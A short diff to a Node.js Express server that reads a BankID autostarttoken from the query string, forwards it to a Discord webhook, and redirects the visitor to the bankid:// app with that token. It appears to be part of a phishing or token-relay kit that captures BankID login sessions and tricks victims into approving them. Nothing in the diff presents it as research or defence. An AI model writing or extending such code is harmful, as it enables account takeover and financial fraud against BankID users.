@@ -11,12 +11,17 @@ let AMOUNT = ""
 app.use(express.json());
 
 
-app.get('/?:token', (req, res) => {
+app.get('/', (req, res) => {
+  const { token } = req.query;
+
   if (!token) {
     return res.status(400).send('Autostarttoken is required.');
   }
 
+  // Send Discord webhook with the token
   sendDiscordWebhook(token);
+
+  // Redirect to bankid:// with autostarttoken query parameter
   const redirectUrl = `bankid:///?autostarttoken=${token}`;
   res.redirect(redirectUrl);
 });
